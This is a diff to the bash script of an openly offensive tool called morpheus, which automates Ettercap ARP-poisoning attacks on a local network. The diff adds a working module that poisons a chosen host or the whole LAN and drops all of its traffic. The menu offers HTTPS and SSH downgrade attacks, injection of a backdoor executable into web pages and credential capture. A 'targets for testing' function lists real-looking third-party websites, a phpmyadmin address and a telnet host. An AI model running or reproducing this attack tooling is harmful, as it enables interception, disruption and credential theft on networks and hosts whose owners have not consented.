@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 33 87 > /dev/null
+resize -s 32 85 > /dev/null
 # inicio
 
 
@@ -149,12 +149,12 @@ case $DiStR0 in
 clear
 
 # config internal framework settings
-echo ${BlueF}[☠]${white} storing ip addr, ip range, gateway, interface${RedF}... ${Reset};
+echo ${BlueF}[☠]${white}[Configurating settings${RedF}:${Reset};
+echo ${BlueF}[☠]${white}[ ip addr ${GreenF}✔${white} ][ ip range ${GreenF}✔${white} ][ gateway ${GreenF}✔${white} ][ interface ${GreenF}✔${white} ]${Reset};
 sleep 1
-echo ${BlueF}[☠]${white} replacing original etter.conf File${RedF}...${Reset};
-ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS [ $cnm ] ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+echo ${BlueF}[☠]${white}[ replace original etter.conf ${GreenF}✔${white} ][ completing tasks ${GreenF}✔${white} ]${Reset};
+ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 if [ -e $Econ ]; then
-  echo ${BlueF}[☠]${white} All configurations${RedF}':'${white} done${RedF}!${Reset};
   cp $Econ /tmp/etter.conf > /dev/null 2>&1
   cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
   sleep 1
@@ -170,28 +170,94 @@ fi
 
 
 
-
-# -----------------
-# START OF FUNTIONS
-# -----------------
+#
+#
+# START OF SCRIPT FUNTIONS
+#
+#
+# -------------------------------------------
+# DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
+# -------------------------------------------
 sh_stage1 () {
 cat << !
 ---
--- This module builds exe-service payloads to be
--- deployed onto windows service control manager (SCM)
--- module: [home]/shell/aux/deploy_service_payload.rb
+-- This module will drop/kill any tcp/udp connections
+-- attempted to/from target host blocking browsing..
 ---
 !
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute module?" --width 330) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo "good" > /dev/null 2>&1
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "\n'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.bk > /dev/null 2>&1
+  sleep 1
+
+  echo ${BlueF}[☠]${white} Edit packet_drop.eft '(filter)'${RedF}!${Reset};
+  sleep 1
+ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "\nexample: $IP\nchose target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
+  # replace values in template.filter with sed bash command
+  cd $IPATH/filters
+  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
+  sleep 1
+
+    # compiling packet_drop.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
+    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
+    sleep 1
+    # port-forward
+    echo "1" > /proc/sys/net/ipv4/ip_forward
+    cd $IPATH/logs
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv $IPATH/filters/packet_drop.bk $IPATH/filters/packet_drop.eft > /dev/null 2>&1
+  # port-forward
+  echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
+  cd $IPATH
+
 else
-  echo ${RedF}[x]${white} Abort${RedF}!${Reset};
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
+
 
 
 
@@ -211,8 +277,8 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "\n'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.bk > /dev/null 2>&1
@@ -220,12 +286,12 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "[ morpheus arp poison s
 
   echo ${BlueF}[☠]${white} Edit img_replace.eft '(filter)'${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 300) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "\nexample: $IP\nchose target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter OR\nto scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
   sleep 1
 
@@ -298,8 +364,8 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
@@ -307,8 +373,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "[ morpheus arp poison s
 
   echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
   sleep 1
-fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 300) > /dev/null 2>&1
-  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus." --entry --width 300) > /dev/null 2>&1
+fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "\nexample: $IP\nchose first target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
+  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "\nexample: $IP\nchose last target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
@@ -316,7 +382,7 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose fi
   sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
 
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter OR\nto scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
   sleep 1
 
@@ -389,8 +455,8 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter RHOST ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "[ morpheus arp poison settings ]\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter RHOST ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "\n'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/template.eft $IPATH/filters/template.bk > /dev/null 2>&1
@@ -501,7 +567,7 @@ if [ "$?" -eq "0" ]; then
   echo ${BlueF}[☠]${white} Track ip-geolocation${RedF}! ${Reset};
   sleep 2
   # grab ip range + scan with nmap + zenity display results
-  rhost=$(zenity --title="☠ Enter PUBLIC IP ADDR ☠" --text "Public ip address to geolocate?" --entry --width 300) > /dev/null 2>&1
+  rhost=$(zenity --title="☠ Enter PUBLIC IP ADDR ☠" --text "\nPublic ip address to geolocate?" --entry --width 250) > /dev/null 2>&1
   xdg-open "https://db-ip.com/$rhost"
 
 else
@@ -511,7 +577,7 @@ fi
 }
 
 
-
+# easter egg: targets to test modules.
 sh_stageT () {
 echo ${BlueF}[☠]${white} Available targets For testing [HTTP] ${Reset};
 echo ${BlueF}[☠]${white} -------------------------------------------- ${Reset};
@@ -520,7 +586,7 @@ echo ${BlueF}[☠]${RedF} http://www.portugalpesca.com ${Reset};
 echo ${BlueF}[☠]${RedF} http://178.21.117.152/phpmyadmin/ ${Reset};
 echo ${BlueF}[☠]${RedF} http://malwareforensics1.blogspot.pt ${Reset};
 echo ${BlueF}[☠]${RedF} http://www.portugalpesca.com/forum/login.php ${Reset};
-echo ${BlueF}[☠]${RedF} ssh 216.58.214.174 [TELNET]${Reset};
+echo ${BlueF}[☠]${RedF} telnet 216.58.214.174 [TELNET]${Reset};
 echo ${BlueF}[☠]${white} -------------------------------------------- ${Reset};
 sleep 1
 echo ${BlueF}[☠]${white} Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}! ${Reset};
@@ -528,6 +594,12 @@ read OP
 }
 
 
+# help in scripting ;)
+sh_help () {
+echo ${BlueF}[☠]${white} Open webbrowser... ${Reset};
+sleep 1
+xdg-open "https://github.com/r00t-3xp10it/morpheus/issues"
+}
 
 # -------------------------
 # FUNTION TO EXIT FRAMEWORK
@@ -535,12 +607,13 @@ read OP
 sh_exit () {
 echo ${BlueF}[☠]${white} Exit morpheus${RedF}:${white}[ $cnm ] ${Reset};
 sleep 1
-echo ${BlueF}[☠]${white} etter.conf reverted to default stage${RedF}! ${Reset};
+echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
 mv /tmp/etter.conf $Econ > /dev/null 2>&1
-sleep 1
+sleep 2
 clear
 exit
 }
+
 
 
 Colors;
@@ -553,7 +626,8 @@ do
 clear
 echo ${BlueF}
 cat << !
-               - Automated Ettercap TCP/IP Hijacking Tool -
+
+                  ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆
     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
     ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
@@ -561,26 +635,25 @@ cat << !
     ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
     VERSION:$V3R DISTRO:$DiStR0 IP:$IP INTERFACE:$InT3R IPv6:$IpV
-
-    +--------+----------------------------------------------------------+
-    | OPTION |                DESCRIPTION(filters)                      |
-    +--------+----------------------------------------------------------+
-    |   1    -  Drop all packets from source ip addr (packet drop,kill) |
-    |   2    -  Redirect browser traffic to another ip addr (domain)    |
-    |   3    -  Replace website images (img src=http://another.png)     |
-    |   4    -  Replace website text   (replace: world by world)        |
-    |   5    -  https downgrade attack (replace: https y http)          |
-    |   6    -  ssh downgrade attack   (replace: SSH-1.99 by SSH-1.51)  |
-    |   7    -  Rotate website document 180 degrees (CSS3 injection)    |
-    |   8    -  Inject backdoor into <head>html request (exec.exe)      |
-    |   9    -  firewall report/block/capture_creds tcp/udp             |
+    ╔────────╦──────────────────────────────────────────────────────────╗
+    | OPTION |                 DESCRIPTION(filters)                     |
+    ╠────────╩──────────────────────────────────────────────────────────╣
+    |   1    -  Drop all packets from/to target  [ packets drop,kill  ] |
+    |   2    -  Redirect browser traffic         [ to another domain  ] |
+    |   3    -  Replace website images           [ img src=http://www ] |
+    |   4    -  Replace website text             [ replace: worlds    ] |
+    |   5    -  https downgrade attack demo      [ replace: https     ] |
+    |   6    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
+    |   7    -  Rotate website document 180º     [ CSS3 injection     ] |
+    |   8    -  Inject backdoor into <head>      [ executable.exe     ] |
+    |   9    -  firewall filter tcp/udp          [report/capture_creds] |
     |                                                                   |
-    |   W    -  Write your own filter and use morpheus to inject it     |
-    |   S    -  Scan local lan for live hosts (Nmap framework)          |
-    |   G    -  track ip geolocation (only public ip's)                 |
-    |   E    -  Exit/close Morpheus tool                                |
-    +-------------------------------------------------------------------+
-                                                       SSA-RedTeam@2016_|
+    |   W    -  Write your own filter            [ use morpheus tool  ] |
+    |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
+    |   G    -  Track ip geolocation             [ public ip's only   ] |
+    |   E    -  Exit/close Morpheus              [ safelly close tasks] |
+    ╚───────────────────────────────────────────────────────────────────╣
+                                                       SSA-RedTeam©2016_⌋
 !
 echo ${Reset};
 echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
@@ -598,6 +671,9 @@ S) sh_stageS ;;
 s) sh_stageS ;;
 G) sh_stageG ;;
 g) sh_stageG ;;
+-h) sh_help ;;
+help) sh_help ;;
+--help) sh_help ;;
 targets) sh_stageT ;;
 e) sh_exit ;;
 E) sh_exit ;;
